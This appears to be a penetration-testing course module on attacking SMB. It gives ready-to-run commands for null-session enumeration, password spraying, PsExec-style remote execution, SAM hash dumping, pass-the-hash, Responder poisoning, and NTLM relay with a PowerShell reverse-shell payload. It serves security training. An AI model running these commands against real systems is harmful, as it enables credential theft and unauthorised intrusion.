# Attacking SMB

[Server Message Block (SMB)](https://en.wikipedia.org/wiki/Server_Message_Block) is one of the most commonly targeted services in both internal and external assessments. Its deep integration with Windows authentication, file sharing, and remote administration makes it a reliable source of credentials, a path to lateral movement, and a channel for command execution -- all depending on what access level is achieved.

## Protocol Background

SMB traditionally ran over NetBIOS on TCP port 139 and UDP ports 137 and 138. From Windows 2000 onward, Microsoft added support for SMB directly over TCP/IP on port 445, removing the dependency on NetBIOS. Modern Windows environments primarily use port 445, but NetBIOS support remains active as a fallback, meaning both ports are worth scanning. [MSRPC (Microsoft Remote Procedure Call)](https://en.wikipedia.org/wiki/Microsoft_RPC) runs on top of SMB via named pipes and provides additional functionality -- including the ability to query users, groups, and policies on the target system.

Samba provides an open-source SMB implementation for Linux and Unix, allowing Linux servers to participate in Windows file-sharing environments and making them targetable through the same toolset.

## Enumeration

Scanning both SMB ports together with version detection and default scripts gives an immediate picture of what the service is and how it is configured:

```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

Key fields to extract from the output:

- **SMB version** -- identifies the Samba or Windows SMB implementation and version
- **Hostname** -- useful for subsequent authentication attempts
- **SMB signing status** -- `Message signing enabled but not required` means the target is potentially vulnerable to relay attacks
- **OS platform** -- Samba confirms a Linux host; Windows hosts typically require additional scans for version identification

## Misconfigurations

### Null Sessions

SMB null sessions allow unauthenticated connections -- no username or password is required. When this is present, a significant amount of information becomes accessible before any credentials are needed.

**smbclient** lists available shares using `-L` for the share list and `-N` to suppress the password prompt:

```bash
smbclient -N -L //10.129.14.128
```

**smbmap** is more useful for initial triage because it shows permission levels alongside each share rather than just names:

```bash
# List shares and their permissions
smbmap -H 10.129.14.128

# Browse a specific share recursively
smbmap -H 10.129.14.128 -r notes

# Download a file
smbmap -H 10.129.14.128 --download "notes\note.txt"

# Upload a file
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

Shares with `READ, WRITE` permissions are immediately actionable -- files can be downloaded for offline review and files can be uploaded, which may support further attack chains if a web server or scheduled task processes content from that location.

**rpcclient** provides a direct interface to MSRPC over SMB. A null session connection uses `'%'` as the user argument (empty username and password):

```bash
rpcclient -U'%' 10.10.110.17
rpcclient $> enumdomusers
```

This returns usernames and their RIDs, which feeds directly into targeted password spraying or further OSINT.

**enum4linux-ng** (the [Python rewrite](https://github.com/cddmp/enum4linux-ng) of the [original Perl tool](https://github.com/CiscoCXSecurity/enum4linux)) automates the most common null-session enumeration tasks by wrapping smbclient, rpcclient, net, and nmblookup into a single run:

```bash
./enum4linux-ng.py 10.10.11.45 -A -C
```

It collects workgroup and domain name, OS information, usernames, groups, share folders, and password policy -- all from a single unauthenticated connection where null sessions are permitted.

## Protocol-Specific Attacks

### Brute Forcing and Password Spraying

When null sessions are blocked, credentials are required. [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) handles both brute-forcing and password spraying against SMB and supports running against multiple targets simultaneously:

```bash
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

A `(Pwn3d!)` result confirms administrative access. The `--continue-on-success` flag keeps spraying after a valid credential is found, useful when mapping which accounts share the same password across a network. The `--local-auth` flag is required when targeting machines that are not domain-joined.

Brute-forcing every password for a single account risks triggering lockout policies. Password spraying -- one or two passwords against many accounts -- avoids this by staying below the lockout threshold. Waiting 30 to 60 minutes between spray rounds provides additional safety margin.

### Remote Code Execution

Once administrative credentials are available on a Windows target, SMB enables direct command execution through several methods.

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) works by uploading a service binary to the `ADMIN$` share, using the DCE/RPC interface to interact with the Windows Service Control Manager, and creating a named pipe for command I/O. Impacket provides a Python implementation:

```bash
impacket-psexec administrator:'Password123!'@10.10.110.17
```

A successful connection typically returns a shell running as `nt authority\system`. The same syntax applies to `impacket-smbexec` and `impacket-atexec`, which use different underlying mechanisms and are useful when the target does not have a writable share available.

CrackMapExec can execute single commands across multiple hosts without opening an interactive shell, which is useful for rapid post-exploitation enumeration:

```bash
# Execute a command via smbexec
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Enumerate logged-on users across a subnet
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

# Dump SAM hashes
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

### Pass-the-Hash

When an NTLM hash is obtained from the SAM database or elsewhere and the plaintext cannot be cracked, it can still be used directly for authentication via Pass-the-Hash (PtH). The hash replaces the password in the authentication flow:

```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

This works because NTLM authentication does not require the plaintext -- it requires proof of knowing the hash. Any Impacket tool that accepts `-hashes LMHASH:NTHASH` supports the same technique.

### Forced Authentication and Hash Capture

Windows name resolution falls back to LLMNR and NBT-NS multicast queries when DNS fails to resolve a hostname. [Responder](https://github.com/lgandx/Responder) poisons these broadcasts by responding on behalf of the requested host, causing the victim's machine to authenticate against the attacker's fake SMB server and surrendering its NTLMv2 hash in the process:

```bash
sudo responder -I ens33
```

The captured NTLMv2 hash is written to `/usr/share/responder/logs/` and can be cracked offline using hashcat module 5600:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Note: multiple hashes may appear for the same account because NTLMv2 uses randomised client-side and server-side challenges for each authentication attempt. Different-looking hashes for the same user represent the same underlying password.

If cracking is not feasible, the hash can be relayed directly to another machine that accepts NTLM authentication. This requires disabling the SMB server in Responder's configuration first (so the hash is not consumed locally) and then running `impacket-ntlmrelayx` against a target:

```bash
# Disable SMB in Responder config
# SMB = Off in /etc/responder/Responder.conf

# Relay to a target and dump SAM
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# Relay and execute a reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64_payload>'
```

The relay attack succeeds when the target machine does not enforce SMB signing, which is why that Nmap result (`Message signing enabled but not required`) is significant -- it is a prerequisite check before attempting relay. A Base64-encoded PowerShell reverse shell payload for the `-c` option can be generated at [revshells.com](https://www.revshells.com/).

## RPC Beyond Enumeration

RPC over SMB is not limited to read operations. With appropriate privileges, `rpcclient` supports write operations against a target including changing user passwords, creating new domain user accounts, and creating new shared folders. The [rpcclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) and the [SANS SMB Access from Linux cheat sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) cover the full command set. These capabilities are explored further in the Active Directory Enumeration and Attacks module.
